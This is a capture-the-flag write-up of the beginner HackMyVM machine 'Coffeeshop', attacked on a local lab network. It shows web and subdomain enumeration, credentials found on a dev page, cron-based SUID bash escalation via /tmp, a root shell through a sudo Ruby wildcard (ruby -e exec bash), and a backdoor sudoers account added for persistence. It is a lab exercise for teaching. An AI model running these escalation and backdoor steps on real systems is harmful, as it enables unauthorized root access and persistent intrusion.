# Coffeeshop

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Coffeeshop | MrMidnight | Beginner | HackMyVM |

**Summary:** Coffeeshop is a beginner-level HackMyVM machine that demonstrates common web enumeration techniques, credential discovery through subdomain analysis, and privilege escalation via cron job exploitation and sudo misconfiguration. The attack path begins with discovering a web application running on port 80, revealing a virtual host reference that leads to directory enumeration. A subdomain enumeration reveals a development site containing hardcoded credentials for a web dashboard. The dashboard exposes SSH credentials for the `tuna` user. Once inside, analyzing bash history and cron jobs reveals a scheduled task executing all `.sh` scripts in `/tmp` as the `shopadmin` user. By creating a malicious script to copy bash with SUID permissions, we escalate to `shopadmin`. Finally, the `shopadmin` user has sudo privileges to execute Ruby with an arbitrary script parameter, which is exploited using GTFOBins documentation to gain a root shell and capture both user and root flags.

---

## Reconnaissance

### Network Scanning

The initial network scan identified the target machine at **192.168.100.106** with MAC address `08:00:27:2A:FE:97` (VirtualBox):

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.106 08:00:27:2A:FE:97 VirtualBox
```

### Port Scanning

A comprehensive Nmap scan revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ nmap -sC -sV -p- -T4 192.168.100.106
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 13:08 WIB
Nmap scan report for 192.168.100.106
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)
|_  256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Under Construction - Midnight Coffee
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
```

**Key Findings:**
- **SSH (22/tcp):** OpenSSH 8.9p1 Ubuntu - Standard version, no immediate vulnerabilities
- **HTTP (80/tcp):** Apache 2.4.52 - Web server hosting "Midnight Coffee" site

### Web Enumeration

Accessing the web service on port 80 revealed an "Under Construction" page for **Midnight Coffee**:

![80](image.png)

Examining the HTML source code revealed an interesting directory structure reference:

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="shot/stylesheet/styles.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #2a1a2d; /* Dark purple background */
            color: #fff;
        }

        header {
            background-color: #1a0d17; /* Dark brown header */
            padding: 20px;
            text-align: center;
        }

        h1 {
            margin: 0;
            font-size: 2em;
            color: #ffbd59; /* Light brown heading color */
        }

        section {
            padding: 40px 20px;
            text-align: center;
        }

        #under-construction {
            font-size: 2.5em;
            margin-bottom: 20px;
            color: #ffbd59; /* Light brown text color */
        }

        footer {
            background-color: #1a0d17; /* Dark brown footer */
            padding: 20px;
            text-align: center;
            position: absolute;
            bottom: 0;
            width: 100%;
        }

        footer p {
            margin: 0;
        }
    </style>
    <title>Under Construction - Midnight Coffee</title>
</head>
<body>
    <header>
        <h1>Midnight Coffee</h1>
    </header>

    <section>
        <h2 id="under-construction">Our website "midnight.coffee" is under Construction</h2>
        <p>We're brewing something new for you. Stay tuned!</p>
    </section>

    <footer>
        <p>&copy; 2024 Midnight Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```

**Notable observations:**
- Reference to `shot/stylesheet/styles.css` - potential directory
- Explicit mention of the domain **"midnight.coffee"** in the page content

### Virtual Host Configuration

Since the website explicitly mentioned `midnight.coffee`, we added it to `/etc/hosts` for proper resolution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ echo '192.168.100.106 midnight.coffee' | sudo tee -a /etc/hosts
192.168.100.106 midnight.coffee

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ cat /etc/hosts | grep 192.168.100.106
192.168.100.106 midnight.coffee

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ curl -I http://midnight.coffee
HTTP/1.1 200 OK
Date: Fri, 13 Feb 2026 06:16:49 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Wed, 03 Jan 2024 16:51:19 GMT
ETag: "69a-60e0d6c9d917a"
Accept-Ranges: bytes
Content-Length: 1690
Vary: Accept-Encoding
Content-Type: text/html
```

### Directory Enumeration

With the hostname configured, we performed directory brute-forcing using Feroxbuster:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ feroxbuster -u http://midnight.coffee/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,zip,bak,pem

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://midnight.coffee/
 🚩  In-Scope Url          │ midnight.coffee
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, zip, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       69l      152w     1690c http://midnight.coffee/index.html
301      GET        9l       28w      317c http://midnight.coffee/shop => http://midnight.coffee/shop/
200      GET       69l      152w     1690c http://midnight.coffee/
200      GET      313l      771w     8776c http://midnight.coffee/shop/stylesheet/styles.css
200      GET       75l      200w     2577c http://midnight.coffee/shop/index.html
200      GET       43l       82w     1202c http://midnight.coffee/shop/login.php
302      GET        0l        0w        0c http://midnight.coffee/shop/dashboard.php => login.php
```

**Key Discoveries:**
- `/shop/` directory containing a web application
- `/shop/login.php` - Authentication page
- `/shop/dashboard.php` - Redirects to login (authentication required)
- `/shop/stylesheet/styles.css` - Stylesheet file

### Login Page Discovery

Accessing the login page at `http://midnight.coffee/shop/login.php`:

![login page](image-1.png)

At this point, we have a login form but no credentials. This calls for subdomain enumeration to discover additional resources.

### Subdomain Enumeration

Using FFUF to discover subdomains, filtering out the default page size (1690 bytes):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://midnight.coffee -H "Host: FUZZ.midnight.coffee" -fs 1690

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://midnight.coffee
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Header           : Host: FUZZ.midnight.coffee
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1690
________________________________________________

dev                     [Status: 200, Size: 1738, Words: 575, Lines: 72, Duration: 18ms]
:: Progress: [4750/4750] :: Job [1/1] :: 1242 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

**Subdomain Found:** `dev.midnight.coffee`

Adding the subdomain to `/etc/hosts`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ sudo sed -i 's/192.168.100.106 midnight.coffee/192.168.100.106 midnight.coffee dev.midnight.coffee/' /etc/hosts
[sudo] password for ouba:

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ cat /etc/hosts | grep 192.168.100.106
192.168.100.106 midnight.coffee dev.midnight.coffee
```

Verifying the subdomain:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ curl -I http://dev.midnight.coffee
HTTP/1.1 200 OK
Date: Fri, 13 Feb 2026 06:34:57 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Wed, 03 Jan 2024 16:52:06 GMT
ETag: "6ca-60e0d6f6c5142"
Accept-Ranges: bytes
Content-Length: 1738
Vary: Accept-Encoding
Content-Type: text/html
```

---

## Initial Access

### Credential Discovery

Accessing the development subdomain at `http://dev.midnight.coffee` revealed **hardcoded credentials** in the page source:

![dev.midnight.coffee](image-2.png)

The development page contained exposed credentials for the shop login interface. This is a common security misconfiguration where developers leave sensitive information in staging or development environments.

### Web Application Access

Using the discovered credentials to authenticate at `http://midnight.coffee/shop/login.php` granted access to the dashboard:

![dashboard](image-3.png)

**Critical Information Obtained:**
The dashboard revealed **SSH credentials** for the `tuna` user along with connection details.

### SSH Access as Tuna

Connecting to the target via SSH using the obtained credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ ssh tuna@192.168.100.106
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
tuna@192.168.100.106's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
...
tuna@coffee-shop:~$ id
uid=1002(tuna) gid=1002(tuna) groups=1002(tuna)
tuna@coffee-shop:~$ ls -la
total 40
drwxr-x--- 3 tuna tuna 4096 Jan  3  2024 .
drwxr-xr-x 5 root root 4096 Jan  3  2024 ..
-rw------- 1 tuna tuna  839 Jan  3  2024 .bash_history
-rw-r--r-- 1 tuna tuna  220 Jan  3  2024 .bash_logout
-rw-r--r-- 1 tuna tuna 3771 Jan  3  2024 .bashrc
drwx------ 2 tuna tuna 4096 Jan  3  2024 .cache
-rw-r--r-- 1 tuna tuna  807 Jan  3  2024 .profile
-rw------- 1 tuna tuna 8410 Jan  3  2024 .viminfo
```

**Initial Foothold Established** as the `tuna` user (UID 1002).

---

## Privilege Escalation

### Internal Enumeration

Enumerating the system to identify privilege escalation vectors:

```bash
tuna@coffee-shop:~$ ls -la /home
total 20
drwxr-xr-x  5 root       root       4096 Jan  3  2024 .
drwxr-xr-x 19 root       root       4096 Jan  3  2024 ..
drwxr-x---  3 mrmidnight mrmidnight 4096 Jan  3  2024 mrmidnight
drwxr-x--x  5 shopadmin  shopadmin  4096 Jan  3  2024 shopadmin
drwxr-x---  3 tuna       tuna       4096 Jan  3  2024 tuna
tuna@coffee-shop:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
mrmidnight:x:1000:1000:mrmidnight:/home/mrmidnight:/bin/bash
shopadmin:x:1001:1001:,,,:/home/shopadmin:/bin/bash
tuna:x:1002:1002:,,,:/home/tuna:/bin/bash
```

**Important Discovery:**
The `shopadmin` home directory has unusual permissions: `drwxr-x--x`. This means:
- Owner (shopadmin): read, write, execute
- Group (shopadmin): read, execute
- Others: **execute only** (can traverse but not list)

This allows us to access files within the directory if we know their names.

### Bash History Analysis

Examining the bash history for clues about system activities:

```bash
tuna@coffee-shop:~$ cat .bash_history
ls
touch coffee_list.txt
vim coffee_list.txt
head coffee_list.txt
vim coffee_list.txt
mv coffee_list.txt unavailable.txt
ls
head unavailable.txt
tail unavailable.txt
mv unavailable.txt available.txt
exit
ls
cd
ls
cat available.txt
rm available.txt
vim available.txt
ls
chmod 777 available.txt
exit
ls
cd
ls
cat available.txt
chmod 777 available.txt
ls
ls -la
chmod a+r available.txt
ls -la
exit
cd
ls
ls -la
ls
cat available.txt
ls
rm available.txt
ls
exit
ls
cd
ls
vim unavailable.sh
bash unavailable.sh
exit
cd
ls
rm unavailable.sh
exit
ls
cd
ls
vim /etc/crontab
exit
ls
cd
ls
cd /tmp
ls
vim uwu.sh
chmod +x uwu.sh
#
ls
vim uwu.sh
ls
chmod +x uwu.sh
rm uwu.sh
ls
cd
ls
exit
ls
cd
ls
cat /home/shopadmin/
cat /home/shopadmin/execute.sh
exit
cat /home/shopadmin/execute.sh
exit
cat /home/shopadmin/execute.sh
cd
ls
exit
```

**Key Observations:**
- Multiple references to `/tmp` directory and shell scripts (`.sh`)
- User attempted to view `/etc/crontab` (cron job configuration)
- Repeated attempts to read `/home/shopadmin/execute.sh`

### Discovering the Cron Job Script

Testing access to the `execute.sh` script:

```bash
tuna@coffee-shop:~$ /home/shopadmin/execute.sh
/bin/bash: /tmp/*.sh: No such file or directory
```

The error message reveals that `/home/shopadmin/execute.sh` contains a command executing all `.sh` files in `/tmp` with a wildcard pattern: `bash /tmp/*.sh` or `. /tmp/*.sh`.

Checking the script's permissions:

```bash
tuna@coffee-shop:~$ ls -la /home/shopadmin/execute.sh
-rwxrwxr-x 1 shopadmin shopadmin 33 Jan  3  2024 /home/shopadmin/execute.sh
```

The script is owned by `shopadmin` and is executable by all users.

### Crontab Analysis

Examining the system's cron configuration:

```bash
tuna@coffee-shop:~$ cat /etc/crontab
...
SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * /bin/bash /home/shopadmin/execute.sh
```

**Critical Finding:**
A cron job runs **every minute** (`* * * * *`) executing `/bin/bash /home/shopadmin/execute.sh`. Since this script executes all `.sh` files in `/tmp`, and `/tmp` is world-writable, we can escalate privileges by placing a malicious script there.

### Exploitation: Cron Job Privilege Escalation

Creating a payload to copy bash with SUID permissions:

```bash
tuna@coffee-shop:/tmp$ vim coffee.sh
tuna@coffee-shop:/tmp$ chmod +x coffee.sh
tuna@coffee-shop:/tmp$ cat coffee.sh
#!/bin/bash

cp /bin/bash /tmp/shopadmin && chmod +s /tmp/shopadmin
tuna@coffee-shop:/tmp$ ls -la /tmp/shopadmin
ls: cannot access '/tmp/shopadmin': No such file or directory
tuna@coffee-shop:/tmp$ sleep 60
tuna@coffee-shop:/tmp$ ls -la /tmp/shopadmin
-rwsr-sr-x 1 shopadmin shopadmin 1396520 Feb 13 07:00 /tmp/shopadmin
```

**Explanation:**
- The script copies `/bin/bash` to `/tmp/shopadmin`
- Sets the SUID and SGID bits (`chmod +s`), allowing execution as the `shopadmin` user
- After waiting approximately 60 seconds, the cron job executes our script
- The resulting binary has SUID permissions: `-rwsr-sr-x 1 shopadmin shopadmin`

### Escalation to Shopadmin

Executing the SUID bash binary:

```bash
tuna@coffee-shop:/tmp$ /tmp/shopadmin -p
shopadmin-5.1$ id
uid=1002(tuna) gid=1002(tuna) euid=1001(shopadmin) egid=1001(shopadmin) groups=1001(shopadmin),1002(tuna)
```

The `-p` flag preserves the effective user and group IDs. We now have **effective UID** as `shopadmin` (euid=1001).

### Upgrading to Full Shopadmin Shell

To fully transition to the `shopadmin` user, we use Python to set real UID/GID:

```bash
shopadmin-5.1$ python3 -c 'import os; os.setregid(1001, 1001); os.setreuid(1001, 1001); os.system("/bin/bash")'
shopadmin@coffee-shop:/tmp$ cd
shopadmin@coffee-shop:~$ id
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin),1002(tuna)
```

**Full Shell as Shopadmin Obtained** (UID 1001).

---

## Root Privilege Escalation

### Sudo Enumeration

Checking sudo privileges for the `shopadmin` user:

```bash
shopadmin@coffee-shop:~$ sudo -l
Matching Defaults entries for shopadmin on coffee-shop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
shopadmin@coffee-shop:~$ ls -la /opt/shop.rb
-rw-r--r-- 1 root root 27 Jan  3  2024 /opt/shop.rb
shopadmin@coffee-shop:~$ cat /opt/shop.rb
puts "C0FF33 SHOPS R L33T"
```

**Vulnerability Analysis:**
- The `shopadmin` user can execute `/usr/bin/ruby * /opt/shop.rb` as root with no password
- The wildcard (`*`) in the sudo configuration allows **arbitrary arguments** to be passed to Ruby before `/opt/shop.rb`
- This permits command-line options like `-e` (execute inline code) to be used

### GTFOBins Research

Consulting GTFOBins (https://gtfobins.org/gtfobins/ruby/) for Ruby privilege escalation techniques:

![gtfo_ruby](image-4.png)

GTFOBins confirms that Ruby's `-e` flag can execute arbitrary code, including spawning a root shell.

### Root Shell Exploitation

Exploiting the sudo misconfiguration to gain root access:

```bash
shopadmin@coffee-shop:~$ sudo /usr/bin/ruby -e 'exec "/bin/bash"' /opt/shop.rb
root@coffee-shop:/home/tuna# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root Access Achieved!**

The `-e 'exec "/bin/bash"'` flag executes before Ruby processes `/opt/shop.rb`, spawning a bash shell with root privileges.

---

## Post-Exploitation

### Persistence Mechanism

Creating a backdoor user with sudo privileges:

```bash
root@coffee-shop:/home/tuna# useradd -m -s /bin/bash ouba
root@coffee-shop:/home/tuna# passwd ouba
New password:
Retype new password:
passwd: password updated successfully
root@coffee-shop:/home/tuna# echo 'ouba ALL=(ALL:ALL) ALL' > /etc/sudoers.d/ouba
root@coffee-shop:/home/tuna# chmod 0440 /etc/sudoers.d/ouba
root@coffee-shop:/home/tuna# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/ouba: parsed OK
```

### Persistent Access Verification

Testing the backdoor account:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/coffeeshop]
└─$ ssh ouba@192.168.100.106
ouba@192.168.100.106's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
...
ouba@coffee-shop:~$ id
uid=1003(ouba) gid=1003(ouba) groups=1003(ouba)
ouba@coffee-shop:~$ sudo -i
[sudo] password for ouba:
root@coffee-shop:~# id
uid=0(root) gid=0(root) groups=0(root)
root@coffee-shop:~# whoami
root
root@coffee-shop:~# hostname
coffee-shop
root@coffee-shop:~# cat /root/root.txt /home/shopadmin/user.txt
[REDACTED]NNN
[REDACTED]GHT
```

**Machine Rooted Successfully!**

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning to identify target at 192.168.100.106. Port scan revealed SSH (22) and HTTP (80) services. Web enumeration identified the domain `midnight.coffee` and directory structure.

2. **Subdomain Discovery**: Conducted virtual host enumeration using FFUF, discovering the `dev.midnight.coffee` subdomain containing hardcoded credentials for the shop application.

3. **Initial Access**: Authenticated to the web dashboard at `midnight.coffee/shop/login.php` using credentials from the development site. Dashboard exposed SSH credentials for the `tuna` user, providing initial system access.

4. **Internal Enumeration**: Analyzed bash history revealing references to `/tmp` scripts and `/home/shopadmin/execute.sh`. Discovered a cron job running every minute that executes all `.sh` scripts in `/tmp` directory.

5. **Horizontal Privilege Escalation**: Exploited the cron job by creating a malicious script (`coffee.sh`) in `/tmp` that copied bash with SUID permissions as `shopadmin`. Executed the SUID binary and upgraded to a full `shopadmin` shell.

6. **Vertical Privilege Escalation**: Enumerated sudo privileges, discovering `shopadmin` can execute `/usr/bin/ruby * /opt/shop.rb` as root without password. Exploited the wildcard in the sudo configuration by passing the `-e` flag to Ruby to execute arbitrary code and spawn a root shell.

7. **Flag Capture**: Retrieved both user flag from `/home/shopadmin/user.txt` and root flag from `/root/root.txt`. Established persistence with a backdoor account for future access.
